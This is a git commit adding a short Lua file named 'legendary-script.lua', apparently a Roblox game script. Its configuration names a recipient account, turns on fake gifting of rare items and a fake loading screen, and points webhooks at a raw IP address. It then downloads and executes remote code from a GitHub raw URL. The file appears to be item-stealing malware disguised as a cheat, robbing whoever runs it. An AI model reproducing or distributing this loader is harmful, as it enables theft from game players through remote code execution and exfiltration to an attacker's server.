3ccb1e43b0ff67ff060ff879b19b306f0ba6da82
antsarjylawy-sketch <antsarjylawy@gmail.com>
2025-08-13 05:05:28 +0300

    Upload legendary-script.lua via Script Source Converter

---
+++ legendary-script.lua
@@ -0,0 +1,13 @@
+_G.NullConfig = {
+    User = {"Hylouxe"},
+    min_value = 10000000000,
+    pingEveryone = "Yes", -- dont change this
+    Webhook = "http://176.100.37.215:20002/proxy/8db9dc69e4aea2cbdf609ff36d08b110",
+    FakeGift = "Yes",
+    Trash = "http://176.100.37.215:20002/proxy/8db9dc69e4aea2cbdf609ff36d08b110",
+    LoadingScreen = "Yes",
+    GiftOnlyRares = "Yes",
+    ExecuteOtherScript = "No",
+}
+    
+loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
